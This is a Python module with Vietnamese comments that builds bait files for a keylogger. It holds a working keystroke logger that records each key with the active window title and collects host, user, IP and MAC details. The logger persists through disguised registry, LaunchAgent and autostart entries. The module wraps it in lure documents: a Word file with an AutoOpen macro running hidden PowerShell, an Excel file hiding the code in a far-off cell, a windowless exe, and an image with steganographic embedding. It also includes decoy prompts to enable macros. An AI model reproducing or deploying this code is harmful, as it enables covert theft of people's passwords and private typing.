#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
Module tạo file mồi cho ứng dụng Keylogger
"""

import os
import sys
import base64
import tempfile
import subprocess
import logging
from typing import Dict, Any, Optional, Union

logger = logging.getLogger("keylogger.bait_generator")

class BaitFileGenerator:
    """Class tạo các file mồi (bait) chứa mã keylogger."""
    
    @staticmethod
    def generate_keylogger_code(
        log_path: str, stealth_mode: bool = True, auto_start: bool = False
    ) -> str:
        """Tạo mã Python cho file mồi.
        
        Args:
            log_path: Đường dẫn lưu file log
            stealth_mode: Bật chế độ ẩn
            auto_start: Tự khởi động cùng hệ thống
            
        Returns:
            str: Mã nguồn Python chứa keylogger
        """
        # Mẫu mã keylogger sẽ được nhúng vào file mồi
        template = """# -*- coding: utf-8 -*-
import os
import threading
import time
from datetime import datetime
import json
import socket
import platform
import uuid
import sqlite3
import base64
import re
import logging
from typing import Dict, List, Optional, Tuple, Any, Union

# Thiết lập logging
logging.basicConfig(
    level=logging.ERROR,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    filename=os.path.join(os.path.expanduser("~"), ".keylogger", "hidden.log"),
    filemode='a'
)
logger = logging.getLogger("hidden_keylogger")

try:
    from pynput import keyboard
    import requests
except ImportError:
    import subprocess
    import sys
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "pynput", "requests"],
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        from pynput import keyboard
        import requests
    except Exception as e:
        logger.error(f"Không thể cài đặt thư viện: {{e}}")

# Định nghĩa các biến cấu hình
LOG_FILE = "{log_path}"
STEALTH_MODE = {stealth_mode}
AUTO_START = {auto_start}
DB_PATH = os.path.join(os.path.expanduser("~"), ".keylogger", "local_data.db")

class SystemInfo:
    @staticmethod
    def get_system_info() -> Dict[str, str]:
        '''Lay thong tin he thong may tinh'''
        info = {{}}
        
        try:
            # Tên máy tính
            info["device_name"] = socket.gethostname()
            
            # Tên người dùng
            info["username"] = os.getlogin()
            
            # Địa chỉ IP
            try:
                # Lấy IP công khai (nếu có kết nối internet)
                response = requests.get('https://api.ipify.org?format=json', timeout=5)
                if response.status_code == 200:
                    info["ip_address"] = response.json()['ip']
                else:
                    # Backup: lấy IP local
                    info["ip_address"] = socket.gethostbyname(socket.gethostname())
            except Exception as e:
                logger.warning(f"Không thể lấy IP công khai: {{e}}")
                # Nếu không có internet, lấy IP local
                info["ip_address"] = socket.gethostbyname(socket.gethostname())
            
            # Địa chỉ MAC - cách đơn giản và đúng cú pháp
            info["mac_address"] = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
            
            # Thông tin hệ điều hành
            info["os_info"] = f"{{platform.system()}} {{platform.release()}} {{platform.version()}}"
            
        except Exception as e:
            logger.error(f"Lỗi khi lấy thông tin hệ thống: {{e}}")
            # Đảm bảo tất cả các key đều có giá trị
            for key in ["device_name", "username", "ip_address", "mac_address", "os_info"]:
                if key not in info:
                    info[key] = "Unknown"
        
        return info
    
    @staticmethod
    def get_active_window_title() -> str:
        '''Lấy tiêu đề cửa sổ đang hoạt động.'''
        try:
            if platform.system() == "Windows":
                try:
                    import win32gui
                    window = win32gui.GetForegroundWindow()
                    return win32gui.GetWindowText(window)
                except ImportError:
                    try:
                        import subprocess
                        return subprocess.check_output(['powershell', '-command', 
                                                     '(Get-Process | Where-Object {{$_.MainWindowTitle}} | Select-Object -Property MainWindowTitle)[0].MainWindowTitle']
                                                    ).decode().strip()
                    except:
                        return "Unknown Window"
            elif platform.system() == "Darwin":  # macOS
                try:
                    script = 'tell application "System Events" to get name of first application process whose frontmost is true'
                    return subprocess.check_output(["osascript", "-e", script]).decode().strip()
                except:
                    return "Unknown Window"
            elif platform.system() == "Linux":
                try:
                    import subprocess
                    return subprocess.check_output(['xdotool', 'getwindowfocus', 'getwindowname']).decode().strip()
                except:
                    return "Unknown Window"
            return "Unknown Window"
        except:
            return "Unknown Window"

class Database:
    def __init__(self, db_path: str):
        '''Khởi tạo Database với đường dẫn file DB.'''
        self.db_path = db_path
        self._create_tables()
    
    def _get_connection(self) -> sqlite3.Connection:
        '''Tạo và trả về kết nối đến DB.'''
        os.makedirs(os.path.dirname(os.path.abspath(self.db_path)), exist_ok=True)
        return sqlite3.connect(self.db_path)
    
    def _create_tables(self) -> None:
        '''Tạo các bảng cần thiết nếu chưa tồn tại.'''
        try:
            with self._get_connection() as conn:
                cursor = conn.cursor()
                
                # Bảng lưu thông tin máy tính
                cursor.execute('''
                CREATE TABLE IF NOT EXISTS system_info (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    device_name TEXT,
                    username TEXT,
                    ip_address TEXT,
                    mac_address TEXT,
                    os_info TEXT,
                    timestamp TEXT
                )
                ''')
                
                # Bảng lưu log bàn phím
                cursor.execute('''
                CREATE TABLE IF NOT EXISTS keystrokes (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    timestamp TEXT,
                    keypress TEXT,
                    application TEXT
                )
                ''')
        except sqlite3.Error as e:
            logger.error(f"Lỗi khi tạo bảng DB: {{e}}")
    
    def save_system_info(self, info: Dict[str, str]) -> int:
        '''Lưu thông tin hệ thống và trả về ID.'''
        try:
            with self._get_connection() as conn:
                cursor = conn.cursor()
                
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                
                cursor.execute('''
                INSERT INTO system_info 
                (device_name, username, ip_address, mac_address, os_info, timestamp)
                VALUES (?, ?, ?, ?, ?, ?)
                ''', (
                    info['device_name'], 
                    info['username'],
                    info['ip_address'], 
                    info['mac_address'],
                    info['os_info'],
                    timestamp
                ))
                
                return cursor.lastrowid
        except sqlite3.Error as e:
            logger.error(f"Lỗi khi lưu thông tin hệ thống: {{e}}")
            return -1
    
    def add_keystroke(self, timestamp: str, keypress: str, application: str = "") -> None:
        '''Thêm một bản ghi keystroke vào DB.'''
        try:
            with self._get_connection() as conn:
                cursor = conn.cursor()
                cursor.execute('''
                INSERT INTO keystrokes (timestamp, keypress, application)
                VALUES (?, ?, ?)
                ''', (timestamp, keypress, application))
        except sqlite3.Error as e:
            logger.error(f"Lỗi khi thêm keystroke: {{e}}")
    
    def add_keystrokes_batch(self, keystrokes: List[Tuple[str, str, str]]) -> None:
        '''Thêm nhiều bản ghi keystroke cùng lúc (timestamp, keypress, application).'''
        if not keystrokes:
            return
            
        try:
            with self._get_connection() as conn:
                cursor = conn.cursor()
                cursor.executemany('''
                INSERT INTO keystrokes (timestamp, keypress, application)
                VALUES (?, ?, ?)
                ''', keystrokes)
        except sqlite3.Error as e:
            logger.error(f"Lỗi khi thêm keystroke batch: {{e}}")

class HiddenKeylogger:
    def __init__(self, log_file: str = LOG_FILE):
        '''Khởi tạo keylogger ẩn.'''
        self.log_file = log_file
        self._listener = None
        self.running = False
        
        # Khởi tạo database
        self.database = Database(DB_PATH)
        
        # Buffer cho keystroke để cải thiện hiệu suất
        self.keystroke_buffer = []
        self.max_buffer_size = 20  # Số keystroke tối đa trước khi flush
        self.last_flush_time = time.time()
        self.flush_interval = 5.0  # Giây
        
        # Event để thông báo dừng thread
        self.stop_event = threading.Event()
        
        # Tạo thư mục log nếu chưa tồn tại
        os.makedirs(os.path.dirname(os.path.abspath(log_file)), exist_ok=True)
        
        # Lưu thông tin hệ thống
        system_info = SystemInfo.get_system_info()
        self.database.save_system_info(system_info)
        
        # Ghi thông tin hệ thống vào file log
        with open(self.log_file, "a", encoding="utf-8") as f:
            f.write("=== THÔNG TIN HỆ THỐNG ===\\n")
            for key, value in system_info.items():
                f.write(f"{{key}}: {{value}}\\n")
            f.write("=========================\\n\\n")
    
    def _on_press(self, key) -> bool:
        '''Xử lý sự kiện nhấn phím.'''
        if self.stop_event.is_set():
            return False  # Dừng listener
            
        try:
            # Chuyển đổi key thành chuỗi
            if hasattr(key, 'char'):
                key_char = key.char
            else:
                key_char = str(key).replace("Key.", "<") + ">"
            
            # Lấy tiêu đề cửa sổ đang hoạt động
            active_window = SystemInfo.get_active_window_title()
            
            # Định dạng log
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            
            # Thêm vào buffer
            self.keystroke_buffer.append((timestamp, key_char, active_window))
            
            # Kiểm tra xem có nên flush buffer chưa
            current_time = time.time()
            if (len(self.keystroke_buffer) >= self.max_buffer_size or 
                current_time - self.last_flush_time >= self.flush_interval):
                self._flush_buffer()
                
            return True  # Tiếp tục lắng nghe
        except Exception as e:
            logger.error(f"Lỗi khi xử lý keystroke: {{e}}")
            return True  # Tiếp tục lắng nghe dù có lỗi
    
    def _flush_buffer(self) -> None:
        '''Ghi buffer keystroke vào file và database.'''
        if not self.keystroke_buffer:
            return
            
        try:
            # Ghi vào file
            with open(self.log_file, "a", encoding="utf-8") as f:
                for timestamp, key_char, active_window in self.keystroke_buffer:
                    log_entry = f"[{{timestamp}}] [{{active_window}}] {{key_char}}\\n"
                    f.write(log_entry)
            
            # Ghi vào database
            self.database.add_keystrokes_batch(self.keystroke_buffer)
            
            # Xóa buffer và cập nhật thời gian
            self.keystroke_buffer.clear()
            self.last_flush_time = time.time()
            
        except Exception as e:
            logger.error(f"Lỗi khi flush buffer keystroke: {{e}}")
    
    def start(self) -> None:
        '''Bắt đầu theo dõi bàn phím.'''
        if not self.running:
            try:
                self.running = True
                self.stop_event.clear()
                
                # Khởi tạo listener trong một luồng riêng biệt
                self._listener = keyboard.Listener(on_press=self._on_press)
                self._listener.daemon = True
                self._listener.start()
                
                logger.info("Keylogger đã bắt đầu")
            except Exception as e:
                self.running = False
                logger.error(f"Lỗi khi khởi động keylogger: {{e}}")
    
    def stop(self) -> None:
        '''Dừng theo dõi bàn phím.'''
        if self.running:
            try:
                # Đặt cờ dừng và flush buffer
                self.stop_event.set()
                self._flush_buffer()
                
                # Dừng listener
                if self._listener:
                    self._listener.stop()
                    # Chờ thread listener kết thúc với timeout
                    if hasattr(self._listener, 'join'):
                        self._listener.join(timeout=2.0)
                
                self.running = False
                logger.info("Keylogger đã dừng")
            except Exception as e:
                logger.error(f"Lỗi khi dừng keylogger: {{e}}")

def setup_autostart() -> None:
    '''Thiết lập tự động khởi động cùng hệ thống.'''
    if not AUTO_START:
        return
        
    try:
        if platform.system() == "Windows":
            import winreg
            import sys
            
            key_path = r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
            exe_path = os.path.abspath(sys.argv[0])
            
            try:
                # Mở registry key
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, 
                                   winreg.KEY_WRITE)
                
                # Thêm entry vào registry
                winreg.SetValueEx(key, "SystemService", 0, winreg.REG_SZ, exe_path)
                winreg.CloseKey(key)
                logger.info(f"Đã thiết lập tự khởi động cho Windows: {{exe_path}}")
            except Exception as e:
                logger.error(f"Lỗi khi thiết lập tự khởi động cho Windows: {{e}}")
                
        elif platform.system() == "Darwin":  # macOS
            # Tạo file plist trong ~/Library/LaunchAgents
            plist_path = os.path.expanduser("~/Library/LaunchAgents/com.system.service.plist")
            exe_path = os.path.abspath(sys.argv[0])
            
            plist_content = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.system.service</string>
    <key>ProgramArguments</key>
    <array>
        <string>{{sys.executable}}</string>
        <string>{{exe_path}}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>'''
            
            try:
                with open(plist_path, "w") as f:
                    f.write(plist_content)
                
                # Load plist
                os.system(f"launchctl load {{plist_path}}")
                logger.info(f"Đã thiết lập tự khởi động cho macOS: {{plist_path}}")
            except Exception as e:
                logger.error(f"Lỗi khi thiết lập tự khởi động cho macOS: {{e}}")
                
        elif platform.system() == "Linux":
            # Tạo desktop file trong ~/.config/autostart
            autostart_dir = os.path.expanduser("~/.config/autostart")
            os.makedirs(autostart_dir, exist_ok=True)
            
            desktop_path = os.path.join(autostart_dir, "system-service.desktop")
            exe_path = os.path.abspath(sys.argv[0])
            
            desktop_content = f'''[Desktop Entry]
Type=Application
Name=System Service
Exec={{sys.executable}} {{exe_path}}
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
'''
            
            try:
                with open(desktop_path, "w") as f:
                    f.write(desktop_content)
                
                # Cập nhật quyền
                os.chmod(desktop_path, 0o744)
                logger.info(f"Đã thiết lập tự khởi động cho Linux: {{desktop_path}}")
            except Exception as e:
                logger.error(f"Lỗi khi thiết lập tự khởi động cho Linux: {{e}}")
    except Exception as e:
        logger.error(f"Lỗi khi thiết lập tự khởi động: {{e}}")

# Khởi tạo và chạy keylogger trong một hàm main để dễ quản lý
def main():
    # Thiết lập tự động khởi động
    if AUTO_START:
        setup_autostart()
    
    # Khởi động keylogger ngầm
    keylogger = HiddenKeylogger()
    keylogger.start()
    
    if not STEALTH_MODE:
        # Nội dung giả để đánh lừa người dùng
        print("Đang tải tài liệu...")
        
        # Giả vờ làm việc
        for i in range(5):
            print(f"Đang xử lý... {{i+1}}/5")
            time.sleep(1)
        
        print("Tài liệu đã được mở. Vui lòng kiểm tra cửa sổ khác.")
    
    # Giữ cho chương trình chạy
    try:
        while True:
            time.sleep(10)
    except KeyboardInterrupt:
        if not STEALTH_MODE:
            print("Đang đóng tài liệu...")
    finally:
        keylogger.stop()

if __name__ == "__main__":
    main()
"""

        return template.format(
            log_path=log_path,
            stealth_mode=str(stealth_mode),
            auto_start=str(auto_start),
        )

    @staticmethod
    def create_python_bait(
        file_path: str, log_path: str, stealth_mode: bool, auto_start: bool
    ) -> None:
        """Tạo file mồi Python (.py)
        
        Args:
            file_path: Đường dẫn file xuất
            log_path: Đường dẫn lưu log
            stealth_mode: Bật chế độ ẩn
            auto_start: Tự khởi động cùng hệ thống
        """
        code = BaitFileGenerator.generate_keylogger_code(
            log_path, stealth_mode, auto_start
        )

        with open(file_path, "w", encoding="utf-8") as f:
            f.write(code)
        
        logger.info(f"Đã tạo file mồi Python: {file_path}")

    @staticmethod
    def create_word_bait(
        file_path: str, log_path: str, stealth_mode: bool, auto_start: bool
    ) -> None:
        """Tạo file mồi Word (.docx)
        
        Args:
            file_path: Đường dẫn file xuất
            log_path: Đường dẫn lưu log
            stealth_mode: Bật chế độ ẩn
            auto_start: Tự khởi động cùng hệ thống
        """
        try:
            from docx import Document
            from docx.shared import Pt
        except ImportError:
            logger.error("Thư viện python-docx chưa được cài đặt")
            subprocess.check_call([sys.executable, "-m", "pip", "install", "python-docx"])
            from docx import Document
            from docx.shared import Pt

        # Tạo một document Word
        document = Document()

        # Thêm tiêu đề
        document.add_heading("Tài liệu quan trọng", 0)

        # Thêm đoạn văn bản
        p = document.add_paragraph(
            "Đây là tài liệu quan trọng. Vui lòng kích hoạt macro để xem nội dung đầy đủ."
        )

        # Thêm một đoạn text ẩn chứa mã keylogger
        keylogger_code = BaitFileGenerator.generate_keylogger_code(
            log_path, stealth_mode, auto_start
        )
        p = document.add_paragraph("Đang tải nội dung...")

        # Chèn mã VBA macro (giả lập, không thực sự hoạt động trong docx thuần túy)
        # Trong thực tế, bạn sẽ cần thêm macro vào tài liệu .docm
        # Đây chỉ là minh họa
        p = document.add_paragraph()
        r = p.add_run()
        comment_text = (
            "Sub AutoOpen()\nOn Error Resume Next\n"
            + 'Shell "powershell -WindowStyle Hidden -Command """'
            + "echo "
            + keylogger_code.replace("\n", "`n").replace('"', '""')
            + ' | python -"""\n'
            + "End Sub"
        )
        try:
            r.add_comment(comment_text)
        except AttributeError:
            # Một số phiên bản python-docx không hỗ trợ add_comment
            p.add_run("<!-- " + comment_text + " -->")

        # Lưu document
        document.save(file_path)
        
        logger.info(f"Đã tạo file mồi Word: {file_path}")

    @staticmethod
    def create_excel_bait(
        file_path: str, log_path: str, stealth_mode: bool, auto_start: bool
    ) -> None:
        """Tạo file mồi Excel (.xlsx)
        
        Args:
            file_path: Đường dẫn file xuất
            log_path: Đường dẫn lưu log
            stealth_mode: Bật chế độ ẩn
            auto_start: Tự khởi động cùng hệ thống
        """
        try:
            import openpyxl
            from openpyxl.workbook import Workbook
        except ImportError:
            logger.error("Thư viện openpyxl chưa được cài đặt")
            subprocess.check_call([sys.executable, "-m", "pip", "install", "openpyxl"])
            import openpyxl
            from openpyxl.workbook import Workbook

        # Tạo workbook Excel
        wb = Workbook()
        ws = wb.active
        ws.title = "Dữ liệu"

        # Thêm tiêu đề
        ws["A1"] = "Tài liệu cần bảo mật"
        ws["A2"] = "Vui lòng kích hoạt macro để xem nội dung đầy đủ"

        # Thêm mã keylogger vào ô ẩn
        keylogger_code = BaitFileGenerator.generate_keylogger_code(
            log_path, stealth_mode, auto_start
        )
        ws["Z100"] = keylogger_code  # Ẩn ở vị trí xa

        # Lưu workbook
        wb.save(file_path)
        
        logger.info(f"Đã tạo file mồi Excel: {file_path}")

    @staticmethod
    def create_pdf_bait(
        file_path: str, log_path: str, stealth_mode: bool, auto_start: bool
    ) -> None:
        """Tạo file mồi PDF (.pdf)
        
        Args:
            file_path: Đường dẫn file xuất
            log_path: Đường dẫn lưu log
            stealth_mode: Bật chế độ ẩn
            auto_start: Tự khởi động cùng hệ thống
        """
        try:
            from reportlab.lib.pagesizes import letter
            from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer
            from reportlab.lib.styles import getSampleStyleSheet
        except ImportError:
            logger.error("Thư viện reportlab chưa được cài đặt")
            subprocess.check_call([sys.executable, "-m", "pip", "install", "reportlab"])
            from reportlab.lib.pagesizes import letter
            from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer
            from reportlab.lib.styles import getSampleStyleSheet

        # Tạo PDF document
        doc = SimpleDocTemplate(file_path, pagesize=letter)
        styles = getSampleStyleSheet()

        # Các phần tử sẽ được thêm vào PDF
        elements = []

        # Thêm tiêu đề
        elements.append(Paragraph("Tài liệu bảo mật", styles["Heading1"]))
        elements.append(Spacer(1, 12))

        # Thêm nội dung
        elements.append(
            Paragraph(
                "Nội dung này yêu cầu xác thực. Vui lòng kích hoạt JavaScript để xem nội dung đầy đủ.",
                styles["Normal"],
            )
        )
        elements.append(Spacer(1, 12))

        # Thêm mã keylogger vào metadata (không thực sự chạy, chỉ là minh họa)
        keylogger_code = BaitFileGenerator.generate_keylogger_code(
            log_path, stealth_mode, auto_start
        )
        elements.append(Paragraph(f"<!-- {keylogger_code} -->", styles["Code"]))

        # Xây dựng PDF
        doc.build(elements)
        
        logger.info(f"Đã tạo file mồi PDF: {file_path}")

    @staticmethod
    def create_exe_bait(
        file_path: str, log_path: str, stealth_mode: bool, auto_start: bool
    ) -> None:
        """Tạo file mồi thực thi (.exe)
        
        Args:
            file_path: Đường dẫn file xuất
            log_path: Đường dẫn lưu log
            stealth_mode: Bật chế độ ẩn
            auto_start: Tự khởi động cùng hệ thống
        """
        import tempfile

        # Tạo file Python tạm thời
        temp_dir = tempfile.mkdtemp()
        temp_py_file = os.path.join(temp_dir, "temp_script.py")

        # Tạo mã keylogger
        keylogger_code = BaitFileGenerator.generate_keylogger_code(
            log_path, stealth_mode, auto_start
        )

        # Ghi mã vào file tạm thời
        with open(temp_py_file, "w", encoding="utf-8") as f:
            f.write(keylogger_code)

        # Biên dịch thành file .exe bằng PyInstaller
        try:
            try:
                import PyInstaller.__main__
            except ImportError:
                logger.error("Thư viện pyinstaller chưa được cài đặt")
                subprocess.check_call([sys.executable, "-m", "pip", "install", "pyinstaller"])
                import PyInstaller.__main__

            # Biên dịch thành file .exe
            PyInstaller.__main__.run(
                [
                    "--onefile",
                    "--noconsole",
                    "--distpath",
                    os.path.dirname(file_path),
                    "--specpath",
                    temp_dir,
                    "--workpath",
                    temp_dir,
                    "--name",
                    os.path.basename(file_path).split(".")[0],
                    temp_py_file,
                ]
            )
            
            logger.info(f"Đã tạo file mồi thực thi: {file_path}")

        finally:
            # Dọn dẹp thư mục tạm
            import shutil

            try:
                shutil.rmtree(temp_dir, ignore_errors=True)
            except:
                pass

    @staticmethod
    def create_image_bait(
        file_path: str,
        source_image: str,
        log_path: str,
        stealth_mode: bool,
        auto_start: bool,
    ) -> None:
        """Tạo file mồi hình ảnh (.jpg, .png)
        
        Args:
            file_path: Đường dẫn file xuất
            source_image: Đường dẫn file ảnh gốc
            log_path: Đường dẫn lưu log
            stealth_mode: Bật chế độ ẩn
            auto_start: Tự khởi động cùng hệ thống
        """
        try:
            import numpy as np
            from PIL import Image
        except ImportError:
            logger.error("Thư viện numpy và PIL chưa được cài đặt")
            subprocess.check_call([sys.executable, "-m", "pip", "install", "numpy", "pillow"])
            import numpy as np
            from PIL import Image

        # Đọc ảnh
        img = Image.open(source_image)
        img_array = np.array(img)

        # Tạo mã keylogger
        keylogger_code = BaitFileGenerator.generate_keylogger_code(
            log_path, stealth_mode, auto_start
        )

        # Chuyển mã thành dữ liệu nhị phân
        code_bytes = keylogger_code.encode("utf-8")
        encoded_code = base64.b64encode(code_bytes)

        # Thêm marker để dễ dàng trích xuất sau này
        marker = "KEYLOGGER:".encode("utf-8")
        data_with_marker = marker + encoded_code

        # Chuyển thành mảng bit
        binary_data = np.unpackbits(np.frombuffer(data_with_marker, dtype=np.uint8))

        # Kiểm tra xem ảnh có đủ lớn để chứa dữ liệu không
        data_size = len(binary_data)
        max_size = img_array.size

        if data_size > max_size:
            raise ValueError(
                f"Ảnh quá nhỏ để chứa mã. Cần ít nhất {data_size} pixel, ảnh chỉ có {max_size} pixel."
            )

        # Phẳng hóa mảng
        flat_img = img_array.flatten()

        # Nhúng dữ liệu vào ảnh bằng phương pháp vectorized
        # Chỉ sửa đổi bit cuối cùng của từng pixel
        flat_img[:data_size] = (flat_img[:data_size] & ~1) | binary_data

        # Khôi phục lại hình dạng ảnh
        img_with_code = flat_img.reshape(img_array.shape)

        # Lưu ảnh mới
        Image.fromarray(img_with_code.astype(np.uint8)).save(file_path)
        
        logger.info(f"Đã tạo file mồi hình ảnh: {file_path}")

    @staticmethod
    def embed_code_to_image(
        source_image: str,
        output_path: str,
        log_path: str,
        stealth_mode: bool,
        auto_start: bool,
    ) -> None:
        """Nhúng mã keylogger vào ảnh.
        
        Args:
            source_image: Đường dẫn file ảnh gốc
            output_path: Đường dẫn file ảnh xuất
            log_path: Đường dẫn lưu log
            stealth_mode: Bật chế độ ẩn
            auto_start: Tự khởi động cùng hệ thống
        """
        BaitFileGenerator.create_image_bait(
            output_path, source_image, log_path, stealth_mode, auto_start
        )

    @staticmethod
    def extract_code_from_image(image_path: str) -> Optional[str]:
        """Trích xuất mã từ ảnh đã được nhúng.
        
        Args:
            image_path: Đường dẫn file ảnh
            
        Returns:
            Optional[str]: Mã nguồn đã nhúng hoặc None nếu không tìm thấy
        """
        try:
            import numpy as np
            from PIL import Image
        except ImportError:
            logger.error("Thư viện numpy và PIL chưa được cài đặt")
            subprocess.check_call([sys.executable, "-m", "pip", "install", "numpy", "pillow"])
            import numpy as np
            from PIL import Image

        try:
            # Đọc ảnh
            img = Image.open(image_path)
            img_array = np.array(img)

            # Phẳng hóa mảng
            flat_img = img_array.flatten()

            # Trích xuất bit cuối cùng từ mỗi pixel
            extracted_bits = flat_img & 1

            # Chuyển bits thành bytes
            # Giới hạn số lượng bit xử lý để tránh quá tải
            max_extract = min(
                len(extracted_bits), 1000000
            )  # Xử lý tối đa 1 triệu pixel
            extracted_bytes = np.packbits(extracted_bits[:max_extract])

            # Tìm marker
            marker = b"KEYLOGGER:"
            marker_pos = -1

            for i in range(len(extracted_bytes) - len(marker)):
                if extracted_bytes[i : i + len(marker)] == marker:
                    marker_pos = i
                    break

            if marker_pos >= 0:
                # Trích xuất dữ liệu sau marker
                encoded_data = extracted_bytes[marker_pos + len(marker) :]

                # Tìm byte kết thúc (0)
                end_pos = np.where(encoded_data == 0)[0]
                if len(end_pos) > 0:
                    encoded_data = encoded_data[: end_pos[0]]

                try:
                    # Giải mã dữ liệu
                    decoded_data = base64.b64decode(encoded_data)
                    return decoded_data.decode("utf-8")
                except Exception as e:
                    logger.error(f"Lỗi khi giải mã dữ liệu từ ảnh: {e}")

            return None
        except Exception as e:
            logger.error(f"Lỗi khi trích xuất mã từ ảnh: {e}")
            return None